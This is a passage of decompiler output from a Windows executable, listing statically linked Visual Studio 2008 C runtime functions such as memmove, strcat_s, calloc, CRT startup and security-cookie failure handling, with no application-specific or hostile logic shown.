      piVar1 = __errno();
      *piVar1 = 0x16;
    }
    else {
      iVar2 = __vsnprintf_helper(__output_s_l,_DstBuf,_DstSize,(int)_Format,_Locale,_ArgList);
      if (iVar2 < 0) {
        *_DstBuf = '\0';
      }
      if (iVar2 != -2) {
        return iVar2;
      }
      piVar1 = __errno();
      *piVar1 = 0x22;
    }
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  return -1;
}



// Library Function - Single Match
//  _vsprintf_s
// 
// Library: Visual Studio 2008 Release

int __cdecl _vsprintf_s(char *_DstBuf,size_t _SizeInBytes,char *_Format,va_list _ArgList)

{
  int iVar1;
  
  iVar1 = __vsprintf_s_l(_DstBuf,_SizeInBytes,_Format,(_locale_t)0x0,_ArgList);
  return iVar1;
}



// Library Function - Single Match
//  __freea
// 
// Library: Visual Studio 2008 Release

void __cdecl __freea(void *_Memory)

{
  if ((_Memory != (void *)0x0) && (*(int *)((int)_Memory + -8) == 0xdddd)) {
    _free((int *)((int)_Memory + -8));
  }
  return;
}



// Library Function - Single Match
//  _wcsncmp
// 
// Library: Visual Studio 2008 Release

int __cdecl _wcsncmp(wchar_t *_Str1,wchar_t *_Str2,size_t _MaxCount)

{
  if (_MaxCount != 0) {
    for (; ((_MaxCount = _MaxCount - 1, _MaxCount != 0 && (*_Str1 != L'\0')) && (*_Str1 == *_Str2));
        _Str1 = _Str1 + 1) {
      _Str2 = _Str2 + 1;
    }
    return (uint)(ushort)*_Str1 - (uint)(ushort)*_Str2;
  }
  return 0;
}



// Library Function - Single Match
//  _strrchr
// 
// Library: Visual Studio 2008 Release

char * __cdecl _strrchr(char *_Str,int _Ch)

{
  char cVar1;
  int iVar2;
  char *pcVar3;
  char *pcVar4;
  
  iVar2 = -1;
  do {
    pcVar4 = _Str;
    if (iVar2 == 0) break;
    iVar2 = iVar2 + -1;
    pcVar4 = _Str + 1;
    cVar1 = *_Str;
    _Str = pcVar4;
  } while (cVar1 != '\0');
  iVar2 = -(iVar2 + 1);
  pcVar4 = pcVar4 + -1;
  do {
    pcVar3 = pcVar4;
    if (iVar2 == 0) break;
    iVar2 = iVar2 + -1;
    pcVar3 = pcVar4 + -1;
    cVar1 = *pcVar4;
    pcVar4 = pcVar3;
  } while ((char)_Ch != cVar1);
  pcVar3 = pcVar3 + 1;
  if (*pcVar3 != (char)_Ch) {
    pcVar3 = (char *)0x0;
  }
  return pcVar3;
}



// Library Function - Single Match
//  _sprintf_s
// 
// Library: Visual Studio 2008 Release

int __cdecl _sprintf_s(char *_DstBuf,size_t _SizeInBytes,char *_Format,...)

{
  int iVar1;
  
  iVar1 = __vsprintf_s_l(_DstBuf,_SizeInBytes,_Format,(_locale_t)0x0,&stack0x00000010);
  return iVar1;
}



// Library Function - Single Match
//  _strcat_s
// 
// Library: Visual Studio 2008 Release

errno_t __cdecl _strcat_s(char *_Dst,rsize_t _SizeInBytes,char *_Src)

{
  char cVar1;
  int *piVar2;
  char *pcVar3;
  errno_t eVar4;
  
  if ((_Dst != (char *)0x0) && (_SizeInBytes != 0)) {
    pcVar3 = _Dst;
    if (_Src != (char *)0x0) {
      do {
        if (*pcVar3 == '\0') break;
        pcVar3 = pcVar3 + 1;
        _SizeInBytes = _SizeInBytes - 1;
      } while (_SizeInBytes != 0);
      if (_SizeInBytes != 0) {
        do {
          cVar1 = *_Src;
          *pcVar3 = cVar1;
          pcVar3 = pcVar3 + 1;
          _Src = _Src + 1;
          if (cVar1 == '\0') break;
          _SizeInBytes = _SizeInBytes - 1;
        } while (_SizeInBytes != 0);
        if (_SizeInBytes != 0) {
          return 0;
        }
        *_Dst = '\0';
        piVar2 = __errno();
        eVar4 = 0x22;
        *piVar2 = 0x22;
        goto LAB_00411b9d;
      }
    }
    *_Dst = '\0';
  }
  piVar2 = __errno();
  eVar4 = 0x16;
  *piVar2 = 0x16;
LAB_00411b9d:
  __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  return eVar4;
}



// Library Function - Single Match
//  _xtow_s@20
// 
// Library: Visual Studio 2008 Release

int _xtow_s_20(uint param_1,uint param_2,uint param_3,int param_4)

{
  short *psVar1;
  short *in_EAX;
  int *piVar2;
  short *psVar3;
  short *psVar4;
  short sVar5;
  int iVar6;
  uint local_8;
  
  if (in_EAX == (short *)0x0) {
    piVar2 = __errno();
    *piVar2 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    return 0x16;
  }
  if (param_2 == 0) {
LAB_00411c23:
    piVar2 = __errno();
    iVar6 = 0x16;
  }
  else {
    *in_EAX = 0;
    if ((param_4 != 0) + 1 < param_2) {
      if (0x22 < param_3 - 2) goto LAB_00411c23;
      psVar3 = in_EAX;
      if (param_4 != 0) {
        param_1 = -param_1;
        *in_EAX = 0x2d;
        psVar3 = in_EAX + 1;
      }
      local_8 = (uint)(param_4 != 0);
      psVar1 = psVar3;
      do {
        psVar4 = psVar1;
        sVar5 = (short)(param_1 % param_3);
        if (param_1 % param_3 < 10) {
          sVar5 = sVar5 + 0x30;
        }
        else {
          sVar5 = sVar5 + 0x57;
        }
        *psVar4 = sVar5;
        local_8 = local_8 + 1;
      } while ((param_1 / param_3 != 0) &&
              (psVar1 = psVar4 + 1, param_1 = param_1 / param_3, local_8 < param_2));
      if (local_8 < param_2) {
        psVar4[1] = 0;
        do {
          sVar5 = *psVar4;
          *psVar4 = *psVar3;
          *psVar3 = sVar5;
          psVar4 = psVar4 + -1;
          psVar3 = psVar3 + 1;
        } while (psVar3 < psVar4);
        return 0;
      }
      *in_EAX = 0;
    }
    piVar2 = __errno();
    iVar6 = 0x22;
  }
  *piVar2 = iVar6;
  __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  return iVar6;
}



// Library Function - Single Match
//  __itow_s
// 
// Library: Visual Studio 2008 Release

errno_t __cdecl __itow_s(int _Val,wchar_t *_DstBuf,size_t _SizeInWords,int _Radix)

{
  int iVar1;
  
  if ((_Radix == 10) && (_Val < 0)) {
    iVar1 = 1;
    _Radix = 10;
  }
  else {
    iVar1 = 0;
  }
  iVar1 = _xtow_s_20(_Val,_SizeInWords,_Radix,iVar1);
  return iVar1;
}



// Library Function - Single Match
//  _memcpy_s
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release

errno_t __cdecl _memcpy_s(void *_Dst,rsize_t _DstSize,void *_Src,rsize_t _MaxCount)

{
  errno_t eVar1;
  int *piVar2;
  
  if (_MaxCount == 0) {
LAB_00411d21:
    eVar1 = 0;
  }
  else {
    if (_Dst == (void *)0x0) {
LAB_00411d2a:
      piVar2 = __errno();
      eVar1 = 0x16;
      *piVar2 = 0x16;
    }
    else {
      if ((_Src != (void *)0x0) && (_MaxCount <= _DstSize)) {
        _memcpy(_Dst,_Src,_MaxCount);
        goto LAB_00411d21;
      }
      _memset(_Dst,0,_DstSize);
      if (_Src == (void *)0x0) goto LAB_00411d2a;
      if (_MaxCount <= _DstSize) {
        return 0x16;
      }
      piVar2 = __errno();
      eVar1 = 0x22;
      *piVar2 = 0x22;
    }
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  return eVar1;
}



// Library Function - Single Match
//  _memmove
// 
// Libraries: Visual Studio 2005 Debug, Visual Studio 2005 Release, Visual Studio 2008 Debug, Visual
// Studio 2008 Release

void * __cdecl _memmove(void *_Dst,void *_Src,size_t _Size)

{
  undefined4 *puVar1;
  uint uVar2;
  uint uVar3;
  undefined4 *puVar4;
  
  if ((_Src < _Dst) && (_Dst < (void *)(_Size + (int)_Src))) {
    puVar1 = (undefined4 *)((_Size - 4) + (int)_Src);
    puVar4 = (undefined4 *)((_Size - 4) + (int)_Dst);
    if (((uint)puVar4 & 3) == 0) {
      uVar2 = _Size >> 2;
      uVar3 = _Size & 3;
      if (7 < uVar2) {
        for (; uVar2 != 0; uVar2 = uVar2 - 1) {
          *puVar4 = *puVar1;
          puVar1 = puVar1 + -1;
          puVar4 = puVar4 + -1;
        }
        switch(uVar3) {
        case 0:
          return _Dst;
        case 2:
          goto switchD_00411f73_caseD_2;
        case 3:
          goto switchD_00411f73_caseD_3;
        }
        goto switchD_00411f73_caseD_1;
      }
    }
    else {
      switch(_Size) {
      case 0:
        goto switchD_00411f73_caseD_0;
      case 1:
        goto switchD_00411f73_caseD_1;
      case 2:
        goto switchD_00411f73_caseD_2;
      case 3:
        goto switchD_00411f73_caseD_3;
      default:
        uVar2 = _Size - ((uint)puVar4 & 3);
        switch((uint)puVar4 & 3) {
        case 1:
          uVar3 = uVar2 & 3;
          *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
          puVar1 = (undefined4 *)((int)puVar1 + -1);
          uVar2 = uVar2 >> 2;
          puVar4 = (undefined4 *)((int)puVar4 - 1);
          if (7 < uVar2) {
            for (; uVar2 != 0; uVar2 = uVar2 - 1) {
              *puVar4 = *puVar1;
              puVar1 = puVar1 + -1;
              puVar4 = puVar4 + -1;
            }
            switch(uVar3) {
            case 0:
              return _Dst;
            case 2:
              goto switchD_00411f73_caseD_2;
            case 3:
              goto switchD_00411f73_caseD_3;
            }
            goto switchD_00411f73_caseD_1;
          }
          break;
        case 2:
          uVar3 = uVar2 & 3;
          *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
          uVar2 = uVar2 >> 2;
          *(undefined *)((int)puVar4 + 2) = *(undefined *)((int)puVar1 + 2);
          puVar1 = (undefined4 *)((int)puVar1 + -2);
          puVar4 = (undefined4 *)((int)puVar4 - 2);
          if (7 < uVar2) {
            for (; uVar2 != 0; uVar2 = uVar2 - 1) {
              *puVar4 = *puVar1;
              puVar1 = puVar1 + -1;
              puVar4 = puVar4 + -1;
            }
            switch(uVar3) {
            case 0:
              return _Dst;
            case 2:
              goto switchD_00411f73_caseD_2;
            case 3:
              goto switchD_00411f73_caseD_3;
            }
            goto switchD_00411f73_caseD_1;
          }
          break;
        case 3:
          uVar3 = uVar2 & 3;
          *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
          *(undefined *)((int)puVar4 + 2) = *(undefined *)((int)puVar1 + 2);
          uVar2 = uVar2 >> 2;
          *(undefined *)((int)puVar4 + 1) = *(undefined *)((int)puVar1 + 1);
          puVar1 = (undefined4 *)((int)puVar1 + -3);
          puVar4 = (undefined4 *)((int)puVar4 - 3);
          if (7 < uVar2) {
            for (; uVar2 != 0; uVar2 = uVar2 - 1) {
              *puVar4 = *puVar1;
              puVar1 = puVar1 + -1;
              puVar4 = puVar4 + -1;
            }
            switch(uVar3) {
            case 0:
              return _Dst;
            case 2:
              goto switchD_00411f73_caseD_2;
            case 3:
              goto switchD_00411f73_caseD_3;
            }
            goto switchD_00411f73_caseD_1;
          }
        }
      }
    }
    switch(uVar2) {
    case 7:
      puVar4[7 - uVar2] = puVar1[7 - uVar2];
    case 6:
      puVar4[6 - uVar2] = puVar1[6 - uVar2];
    case 5:
      puVar4[5 - uVar2] = puVar1[5 - uVar2];
    case 4:
      puVar4[4 - uVar2] = puVar1[4 - uVar2];
    case 3:
      puVar4[3 - uVar2] = puVar1[3 - uVar2];
    case 2:
      puVar4[2 - uVar2] = puVar1[2 - uVar2];
    case 1:
      puVar4[1 - uVar2] = puVar1[1 - uVar2];
      puVar1 = puVar1 + -uVar2;
      puVar4 = puVar4 + -uVar2;
    }
    switch(uVar3) {
    case 1:
switchD_00411f73_caseD_1:
      *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
      return _Dst;
    case 2:
switchD_00411f73_caseD_2:
      *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
      *(undefined *)((int)puVar4 + 2) = *(undefined *)((int)puVar1 + 2);
      return _Dst;
    case 3:
switchD_00411f73_caseD_3:
      *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
      *(undefined *)((int)puVar4 + 2) = *(undefined *)((int)puVar1 + 2);
      *(undefined *)((int)puVar4 + 1) = *(undefined *)((int)puVar1 + 1);
      return _Dst;
    }
switchD_00411f73_caseD_0:
    return _Dst;
  }
  if (((0xff < _Size) && (DAT_0042d778 != 0)) && (((uint)_Dst & 0xf) == ((uint)_Src & 0xf))) {
    puVar1 = __VEC_memcpy((undefined4 *)_Dst,(undefined4 *)_Src,_Size);
    return puVar1;
  }
  puVar1 = (undefined4 *)_Dst;
  if (((uint)_Dst & 3) == 0) {
    uVar2 = _Size >> 2;
    uVar3 = _Size & 3;
    if (7 < uVar2) {
                    // WARNING: Load size is inaccurate
      for (; uVar2 != 0; uVar2 = uVar2 - 1) {
        *puVar1 = *_Src;
        _Src = (undefined4 *)((int)_Src + 4);
        puVar1 = puVar1 + 1;
      }
      switch(uVar3) {
      case 0:
        return _Dst;
      case 2:
        goto switchD_00411dec_caseD_2;
      case 3:
        goto switchD_00411dec_caseD_3;
      }
      goto switchD_00411dec_caseD_1;
    }
  }
  else {
    switch(_Size) {
    case 0:
      goto switchD_00411dec_caseD_0;
    case 1:
      goto switchD_00411dec_caseD_1;
    case 2:
      goto switchD_00411dec_caseD_2;
    case 3:
      goto switchD_00411dec_caseD_3;
    default:
      uVar2 = (_Size - 4) + ((uint)_Dst & 3);
      switch((uint)_Dst & 3) {
      case 1:
        uVar3 = uVar2 & 3;
                    // WARNING: Load size is inaccurate
        *(undefined *)_Dst = *_Src;
        *(undefined *)((int)_Dst + 1) = *(undefined *)((int)_Src + 1);
        uVar2 = uVar2 >> 2;
        *(undefined *)((int)_Dst + 2) = *(undefined *)((int)_Src + 2);
        _Src = (void *)((int)_Src + 3);
        puVar1 = (undefined4 *)((int)_Dst + 3);
        if (7 < uVar2) {
                    // WARNING: Load size is inaccurate
          for (; uVar2 != 0; uVar2 = uVar2 - 1) {
            *puVar1 = *_Src;
            _Src = (undefined4 *)((int)_Src + 4);
            puVar1 = puVar1 + 1;
          }
          switch(uVar3) {
          case 0:
            return _Dst;
          case 2:
            goto switchD_00411dec_caseD_2;
          case 3:
            goto switchD_00411dec_caseD_3;
          }
          goto switchD_00411dec_caseD_1;
        }
        break;
      case 2:
        uVar3 = uVar2 & 3;
                    // WARNING: Load size is inaccurate
        *(undefined *)_Dst = *_Src;
        uVar2 = uVar2 >> 2;
        *(undefined *)((int)_Dst + 1) = *(undefined *)((int)_Src + 1);
        _Src = (void *)((int)_Src + 2);
        puVar1 = (undefined4 *)((int)_Dst + 2);
        if (7 < uVar2) {
                    // WARNING: Load size is inaccurate
          for (; uVar2 != 0; uVar2 = uVar2 - 1) {
            *puVar1 = *_Src;
            _Src = (undefined4 *)((int)_Src + 4);
            puVar1 = puVar1 + 1;
          }
          switch(uVar3) {
          case 0:
            return _Dst;
          case 2:
            goto switchD_00411dec_caseD_2;
          case 3:
            goto switchD_00411dec_caseD_3;
          }
          goto switchD_00411dec_caseD_1;
        }
        break;
      case 3:
        uVar3 = uVar2 & 3;
                    // WARNING: Load size is inaccurate
        *(undefined *)_Dst = *_Src;
        _Src = (void *)((int)_Src + 1);
        uVar2 = uVar2 >> 2;
        puVar1 = (undefined4 *)((int)_Dst + 1);
        if (7 < uVar2) {
                    // WARNING: Load size is inaccurate
          for (; uVar2 != 0; uVar2 = uVar2 - 1) {
            *puVar1 = *_Src;
            _Src = (undefined4 *)((int)_Src + 4);
            puVar1 = puVar1 + 1;
          }
          switch(uVar3) {
          case 0:
            return _Dst;
          case 2:
            goto switchD_00411dec_caseD_2;
          case 3:
            goto switchD_00411dec_caseD_3;
          }
          goto switchD_00411dec_caseD_1;
        }
      }
    }
  }
                    // WARNING: Could not find normalized switch variable to match jumptable
  switch(uVar2) {
  case 0x1c:
  case 0x1d:
  case 0x1e:
  case 0x1f:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 7] = *(undefined4 *)((int)_Src + (uVar2 - 7) * 4);
  case 0x18:
  case 0x19:
  case 0x1a:
  case 0x1b:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 6] = *(undefined4 *)((int)_Src + (uVar2 - 6) * 4);
  case 0x14:
  case 0x15:
  case 0x16:
  case 0x17:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 5] = *(undefined4 *)((int)_Src + (uVar2 - 5) * 4);
  case 0x10:
  case 0x11:
  case 0x12:
  case 0x13:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 4] = *(undefined4 *)((int)_Src + (uVar2 - 4) * 4);
  case 0xc:
  case 0xd:
  case 0xe:
  case 0xf:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 3] = *(undefined4 *)((int)_Src + (uVar2 - 3) * 4);
  case 8:
  case 9:
  case 10:
  case 0xb:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 2] = *(undefined4 *)((int)_Src + (uVar2 - 2) * 4);
  case 4:
  case 5:
  case 6:
  case 7:
    puVar1[uVar2 - 1] = *(undefined4 *)((int)_Src + (uVar2 - 1) * 4);
    _Src = (void *)((int)_Src + uVar2 * 4);
    puVar1 = puVar1 + uVar2;
  }
  switch(uVar3) {
  case 1:
switchD_00411dec_caseD_1:
                    // WARNING: Load size is inaccurate
    *(undefined *)puVar1 = *_Src;
    return _Dst;
  case 2:
switchD_00411dec_caseD_2:
                    // WARNING: Load size is inaccurate
    *(undefined *)puVar1 = *_Src;
    *(undefined *)((int)puVar1 + 1) = *(undefined *)((int)_Src + 1);
    return _Dst;
  case 3:
switchD_00411dec_caseD_3:
                    // WARNING: Load size is inaccurate
    *(undefined *)puVar1 = *_Src;
    *(undefined *)((int)puVar1 + 1) = *(undefined *)((int)_Src + 1);
    *(undefined *)((int)puVar1 + 2) = *(undefined *)((int)_Src + 2);
    return _Dst;
  }
switchD_00411dec_caseD_0:
  return _Dst;
}



// Library Function - Single Match
//  _calloc
// 
// Library: Visual Studio 2008 Release

void * __cdecl _calloc(size_t _Count,size_t _Size)

{
  int *piVar1;
  int *piVar2;
  int local_8;
  
  local_8 = 0;
  piVar1 = __calloc_impl(_Count,_Size,&local_8);
  if ((piVar1 == (int *)0x0) && (local_8 != 0)) {
    piVar2 = __errno();
    if (piVar2 != (int *)0x0) {
      piVar2 = __errno();
      *piVar2 = local_8;
    }
  }
  return piVar1;
}



// Library Function - Single Match
//  _fast_error_exit
// 
// Library: Visual Studio 2008 Release

void __cdecl _fast_error_exit(int param_1)

{
  if (DAT_0042b9d8 == 1) {
    __FF_MSGBANNER();
  }
  __NMSG_WRITE(param_1);
  ___crtExitProcess(0xff);
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// WARNING: Removing unreachable block (ram,0x004122f4)
// Library Function - Single Match
//  ___tmainCRTStartup
// 
// Library: Visual Studio 2008 Release

int ___tmainCRTStartup(void)

{
  int iVar1;
  short *psVar2;
  _STARTUPINFOW local_6c;
  int local_24;
  int local_20;
  undefined4 uStack_c;
  undefined4 local_8;
  
  uStack_c = 0x412299;
  local_8 = 0;
  GetStartupInfoW(&local_6c);
  local_8 = 0xfffffffe;
  local_20 = 0;
  iVar1 = __heap_init();
  if (iVar1 == 0) {
    _fast_error_exit(0x1c);
  }
  iVar1 = __mtinit();
  if (iVar1 == 0) {
    _fast_error_exit(0x10);
  }
  __RTC_Initialize();
  local_8 = 1;
  iVar1 = __ioinit();
  if (iVar1 < 0) {
    __amsg_exit(0x1b);
  }
  DAT_0042e8d4 = GetCommandLineW();
  DAT_0042b9d4 = ___crtGetEnvironmentStringsW();
  iVar1 = __wsetargv();
  if (iVar1 < 0) {
    __amsg_exit(8);
  }
  iVar1 = __wsetenvp();
  if (iVar1 < 0) {
    __amsg_exit(9);
  }
  iVar1 = __cinit(1);
  if (iVar1 != 0) {
    __amsg_exit(iVar1);
  }
  psVar2 = (short *)__wwincmdln();
  local_24 = FUN_00401000((HINSTANCE)&IMAGE_DOS_HEADER_00400000,0,psVar2);
  if (local_20 == 0) {
                    // WARNING: Subroutine does not return
    _exit(local_24);
  }
  __cexit();
  return local_24;
}



void entry(void)

{
  ___security_init_cookie();
  ___tmainCRTStartup();
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  ___report_gsfailure
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release, Visual Studio 2010 Release

void __cdecl ___report_gsfailure(void)

{
  undefined4 in_EAX;
  HANDLE hProcess;
  undefined4 in_ECX;
  undefined4 in_EDX;
  undefined4 unaff_EBX;
  undefined4 unaff_EBP;
  undefined4 unaff_ESI;
  undefined4 unaff_EDI;
  undefined2 in_ES;
  undefined2 in_CS;
  undefined2 in_SS;
  undefined2 in_DS;
  undefined2 in_FS;
  undefined2 in_GS;
  byte in_AF;
  byte in_TF;
  byte in_IF;
  byte in_NT;
  byte in_AC;
  byte in_VIF;
  byte in_VIP;
  byte in_ID;
  undefined4 unaff_retaddr;
  UINT uExitCode;
  undefined4 local_32c;
  undefined4 local_328;
  
  _DAT_0042baf8 =
       (uint)(in_NT & 1) * 0x4000 | (uint)SBORROW4((int)&stack0xfffffffc,0x328) * 0x800 |
       (uint)(in_IF & 1) * 0x200 | (uint)(in_TF & 1) * 0x100 | (uint)((int)&local_32c < 0) * 0x80 |
       (uint)(&stack0x00000000 == (undefined *)0x32c) * 0x40 | (uint)(in_AF & 1) * 0x10 |
       (uint)((POPCOUNT((uint)&local_32c & 0xff) & 1U) == 0) * 4 |
       (uint)(&stack0xfffffffc < (undefined *)0x328) | (uint)(in_ID & 1) * 0x200000 |
       (uint)(in_VIP & 1) * 0x100000 | (uint)(in_VIF & 1) * 0x80000 | (uint)(in_AC & 1) * 0x40000;
  _DAT_0042bafc = &stack0x00000004;
  _DAT_0042ba38 = 0x10001;
  _DAT_0042b9e0 = 0xc0000409;
  _DAT_0042b9e4 = 1;
  local_32c = DAT_0042a044;
  local_328 = DAT_0042a048;
  _DAT_0042b9ec = unaff_retaddr;
  _DAT_0042bac4 = in_GS;
  _DAT_0042bac8 = in_FS;
  _DAT_0042bacc = in_ES;
  _DAT_0042bad0 = in_DS;
  _DAT_0042bad4 = unaff_EDI;
  _DAT_0042bad8 = unaff_ESI;
  _DAT_0042badc = unaff_EBX;
  _DAT_0042bae0 = in_EDX;
  _DAT_0042bae4 = in_ECX;
  _DAT_0042bae8 = in_EAX;
  _DAT_0042baec = unaff_EBP;
  DAT_0042baf0 = unaff_retaddr;
  _DAT_0042baf4 = in_CS;
  _DAT_0042bb00 = in_SS;
  DAT_0042ba30 = IsDebuggerPresent();
  FUN_0041976b();
  SetUnhandledExceptionFilter((LPTOP_LEVEL_EXCEPTION_FILTER)0x0);
  UnhandledExceptionFilter((_EXCEPTION_POINTERS *)&PTR_DAT_00422298);
  if (DAT_0042ba30 == 0) {
    FUN_0041976b();
  }
  uExitCode = 0xc0000409;
  hProcess = GetCurrentProcess();
  TerminateProcess(hProcess,uExitCode);
  return;
}



void __cdecl FUN_0041251a(undefined4 param_1)

{
  DAT_0042bd04 = param_1;
  return;
}



// Library Function - Single Match
//  __invoke_watson
// 
// Library: Visual Studio 2008 Release

void __cdecl
__invoke_watson(wchar_t *param_1,wchar_t *param_2,wchar_t *param_3,uint param_4,uintptr_t param_5)

{
  uint uVar1;
  BOOL BVar2;
  LONG LVar3;
  HANDLE hProcess;
  UINT uExitCode;
  EXCEPTION_RECORD local_32c;
  _EXCEPTION_POINTERS local_2dc;
  undefined4 local_2d4;
  
  uVar1 = DAT_0042a044 ^ (uint)&stack0xfffffffc;
  local_32c.ExceptionCode = 0;
  _memset(&local_32c.ExceptionFlags,0,0x4c);
  local_2dc.ExceptionRecord = &local_32c;
  local_2dc.ContextRecord = (PCONTEXT)&local_2d4;
  local_2d4 = 0x10001;
  local_32c.ExceptionCode = 0xc0000417;
  local_32c.ExceptionFlags = 1;
  BVar2 = IsDebuggerPresent();
  SetUnhandledExceptionFilter((LPTOP_LEVEL_EXCEPTION_FILTER)0x0);
  LVar3 = UnhandledExceptionFilter(&local_2dc);
  if ((LVar3 == 0) && (BVar2 == 0)) {
    FUN_0041976b();
  }
  uExitCode = 0xc0000417;
  hProcess = GetCurrentProcess();
  TerminateProcess(hProcess,uExitCode);
  ___security_check_cookie_4(uVar1 ^ (uint)&stack0xfffffffc);
  return;
}



// Library Function - Single Match
//  __invalid_parameter
// 
// Library: Visual Studio 2008 Release

void __cdecl
__invalid_parameter(wchar_t *param_1,wchar_t *param_2,wchar_t *param_3,uint param_4,
                   uintptr_t param_5)

{
  code *UNRECOVERED_JUMPTABLE;
  
  UNRECOVERED_JUMPTABLE = (code *)__decode_pointer(DAT_0042bd04);
  if (UNRECOVERED_JUMPTABLE != (code *)0x0) {
                    // WARNING: Could not recover jumptable at 0x00412667. Too many branches
                    // WARNING: Treating indirect jump as call
    (*UNRECOVERED_JUMPTABLE)();
    return;
  }
  FUN_0041976b();
                    // WARNING: Subroutine does not return
  __invoke_watson(param_1,param_2,param_3,param_4,param_5);
}



// Library Function - Single Match
//  __get_errno_from_oserr
// 
// Library: Visual Studio 2008 Release

int __cdecl __get_errno_from_oserr(ulong param_1)

{
  uint uVar1;
  
  uVar1 = 0;
  do {
    if (param_1 == (&DAT_0042a050)[uVar1 * 2]) {
      return (&DAT_0042a054)[uVar1 * 2];
    }
    uVar1 = uVar1 + 1;
  } while (uVar1 < 0x2d);
  if (param_1 - 0x13 < 0x12) {
    return 0xd;
  }
  return (-(uint)(0xe < param_1 - 0xbc) & 0xe) + 8;
}



// Library Function - Single Match
//  __errno
// 
// Library: Visual Studio 2008 Release

int * __cdecl __errno(void)

{
  _ptiddata p_Var1;
  
  p_Var1 = __getptd_noexit();
  if (p_Var1 == (_ptiddata)0x0) {
    return (int *)&DAT_0042a1b8;
  }
  return &p_Var1->_terrno;
}



// Library Function - Single Match
//  ___doserrno
// 
// Library: Visual Studio 2008 Release

ulong * __cdecl ___doserrno(void)

{
  _ptiddata p_Var1;
  
  p_Var1 = __getptd_noexit();
  if (p_Var1 == (_ptiddata)0x0) {
    return (ulong *)&DAT_0042a1bc;
  }
  return &p_Var1->_tdoserrno;
}



// Library Function - Single Match
//  __dosmaperr
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __cdecl __dosmaperr(ulong param_1)

{
  ulong *puVar1;
  int iVar2;
  int *piVar3;
  
  puVar1 = ___doserrno();
  *puVar1 = param_1;
  iVar2 = __get_errno_from_oserr(param_1);
  piVar3 = __errno();
  *piVar3 = iVar2;
  return;
}



// Library Function - Single Match
//  __encode_pointer
// 
// Library: Visual Studio 2008 Release

int __cdecl __encode_pointer(int param_1)

{
  LPVOID pvVar1;
  code *pcVar2;
  int iVar3;
  HMODULE hModule;
  FARPROC pFVar4;
  
  pvVar1 = TlsGetValue(DAT_0042a1c4);
  if ((pvVar1 != (LPVOID)0x0) && (DAT_0042a1c0 != -1)) {
    iVar3 = DAT_0042a1c0;
    pcVar2 = (code *)TlsGetValue(DAT_0042a1c4);
    iVar3 = (*pcVar2)(iVar3);
    if (iVar3 != 0) {
      pFVar4 = *(FARPROC *)(iVar3 + 0x1f8);
      goto LAB_00412762;
    }
  }
  hModule = GetModuleHandleW(u_KERNEL32_DLL_004222b0);
  if ((hModule == (HMODULE)0x0) &&
     (hModule = (HMODULE)__crt_waiting_on_module_handle(u_KERNEL32_DLL_004222b0),
     hModule == (HMODULE)0x0)) {
    return param_1;
  }
  pFVar4 = GetProcAddress(hModule,s_EncodePointer_004222a0);
LAB_00412762:
  if (pFVar4 != (FARPROC)0x0) {
    param_1 = (*pFVar4)(param_1);
  }
  return param_1;
}



// Library Function - Single Match
//  __encoded_null
// 
// Library: Visual Studio 2008 Release

void __encoded_null(void)

{
  __encode_pointer(0);
  return;
}



// Library Function - Single Match
//  __decode_pointer
// 
// Library: Visual Studio 2008 Release

int __cdecl __decode_pointer(int param_1)

{
  LPVOID pvVar1;
  code *pcVar2;
  int iVar3;
  HMODULE hModule;
  FARPROC pFVar4;
  
  pvVar1 = TlsGetValue(DAT_0042a1c4);
  if ((pvVar1 != (LPVOID)0x0) && (DAT_0042a1c0 != -1)) {
    iVar3 = DAT_0042a1c0;
    pcVar2 = (code *)TlsGetValue(DAT_0042a1c4);
    iVar3 = (*pcVar2)(iVar3);
    if (iVar3 != 0) {
      pFVar4 = *(FARPROC *)(iVar3 + 0x1fc);
      goto LAB_004127dd;
    }
  }
  hModule = GetModuleHandleW(u_KERNEL32_DLL_004222b0);
  if ((hModule == (HMODULE)0x0) &&
     (hModule = (HMODULE)__crt_waiting_on_module_handle(u_KERNEL32_DLL_004222b0),
     hModule == (HMODULE)0x0)) {
    return param_1;
  }
  pFVar4 = GetProcAddress(hModule,s_DecodePointer_004222cc);
LAB_004127dd:
  if (pFVar4 != (FARPROC)0x0) {
    param_1 = (*pFVar4)(param_1);
  }
  return param_1;
}



// Library Function - Single Match
//  ___set_flsgetvalue
// 
// Library: Visual Studio 2008 Release

LPVOID ___set_flsgetvalue(void)

{
  LPVOID lpTlsValue;
  
  lpTlsValue = TlsGetValue(DAT_0042a1c4);
  if (lpTlsValue == (LPVOID)0x0) {
    lpTlsValue = (LPVOID)__decode_pointer(DAT_0042bd0c);
    TlsSetValue(DAT_0042a1c4,lpTlsValue);
  }
  return lpTlsValue;
}



// Library Function - Single Match
//  __mtterm
// 
// Library: Visual Studio 2008 Release

void __cdecl __mtterm(void)

{
  code *pcVar1;
  int iVar2;
  
  if (DAT_0042a1c0 != -1) {
    iVar2 = DAT_0042a1c0;
